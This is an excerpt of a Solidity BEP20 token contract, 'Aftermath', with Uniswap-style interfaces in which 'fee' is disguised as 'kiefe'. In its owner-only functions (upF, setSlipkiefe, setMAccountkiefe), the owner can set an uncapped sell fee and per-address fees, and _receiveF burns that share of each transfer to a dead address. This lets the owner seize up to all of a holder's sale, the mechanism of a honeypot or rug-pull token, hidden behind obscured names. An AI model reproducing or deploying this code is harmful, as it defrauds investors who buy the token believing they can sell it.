...
interface IUniswapV2Factory {
    ...
    function kiefeTo() external view returns (address);
    function kiefeToSetter() external view returns (address);
    ...
    function setkiefeTo(address) external;
    function setkiefeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkiefeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkiefeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkiefeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkiefeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkiefeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Aftermath is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellkiefe = 0;

    uint256 private _defaultBuykiefe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkiefe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkiefe = _value;
    }

    function setSlipkiefe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkiefe[_address] = _value;
    }

    function getSlipkiefe(address _address) external view onlyownar returns (uint256) {
        return _slipkiefe[_address];
    }


    function setMAccountkiefe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkiefe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekiefeAmount = 0;

        if (rF) {
            uint256 tradekiefe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekiefe = _defaultSellkiefe;
                }
                if (from == uniswapV2Pair) {

                    tradekiefe = _defaultBuykiefe;
                }
            }
            if (_slipkiefe[from] > 0) {
                tradekiefe = _slipkiefe[from];
            }

            tradekiefeAmount = _Amount.mul(tradekiefe).div(100);
        }


        if (tradekiefeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekiefeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekiefeAmount);
            emit Transfer(from, _deadAddress, tradekiefeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekiefeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekiefeAmount);
        emit Transfer(from, _to, _Amount - tradekiefeAmount);
    }
